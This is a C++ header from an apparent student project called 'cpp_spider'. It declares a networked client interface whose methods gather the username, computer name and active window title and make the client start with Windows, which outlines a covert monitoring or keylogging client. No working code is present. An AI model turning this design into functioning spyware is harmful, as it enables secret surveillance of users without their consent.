/*
** IClient.hpp for cpp_spider in E:\cpp_spider\Client
**
** Made by august_t
** Login   <august_t@epitech.net>
**
** Started on  Fri Sep 29 14:35:15 2017 august_t
** Last update	Thu Oct 05 16:53:08 2017 Sonny Fournier
*/

#ifndef _ICLIENT_HPP_
#define _ICLIENT_HPP_

#define _WIN32_WINNT 0x0502

#include <array>
#include <string>
#include <memory>
#include <cstdlib>
#include <utility>
#include <Lmcons.h>
#include <iostream>
#include <type_traits>
#include <boost/asio.hpp>
#include <boost/asio/write.hpp>
#include <boost/array.hpp>
#include <boost/bind.hpp>
#include <boost/archive/text_oarchive.hpp>
#include <boost/archive/text_iarchive.hpp>
#include <boost/tuple/tuple_io.hpp>
#include <boost/tuple/tuple.hpp>
#include <boost/tuple/tuple_comparison.hpp>
#include <ctime>
#include <sstream>
#include <boost/shared_ptr.hpp>
#include <boost/enable_shared_from_this.hpp>
#include <fstream>


class   IClient
{
public:
  virtual bool          isConnected() = 0;
  virtual void          connect() = 0;
  virtual void          clientRead() = 0;
  virtual void          start() = 0;
  virtual void          stop() = 0;
  virtual void          clientWrite() = 0;
  virtual void          copyInBuf(std::string data) = 0;
  virtual std::string   getUsername() = 0;
  virtual std::string   getComputerName() = 0;
  virtual std::string   getActiveWindowTitle() = 0;
  virtual void          startWithWindows() = 0;

};

#endif /* !_ICLIENT_HPP_ */
